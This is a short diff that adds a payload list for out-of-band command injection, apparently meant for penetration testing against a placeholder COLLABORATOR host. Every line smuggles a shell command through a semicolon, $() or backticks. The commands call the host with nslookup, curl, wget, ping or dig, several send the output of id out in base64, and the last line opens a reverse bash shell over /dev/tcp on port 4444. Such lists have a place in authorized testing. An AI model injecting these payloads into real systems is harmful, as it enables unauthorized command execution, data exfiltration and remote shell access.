@@ -1,0 +1,11 @@
+;nslookup COLLABORATOR
+;curl http://COLLABORATOR
+;wget http://COLLABORATOR
+;ping -c 1 COLLABORATOR
+;dig COLLABORATOR
+$(curl http://COLLABORATOR)
+`curl http://COLLABORATOR`
+;curl -d "$(id)" http://COLLABORATOR
+;curl http://COLLABORATOR/$(id|base64)
+;wget -q -O- http://COLLABORATOR/?c=$(id|base64)
+;bash -i >& /dev/tcp/COLLABORATOR/4444 0>&1
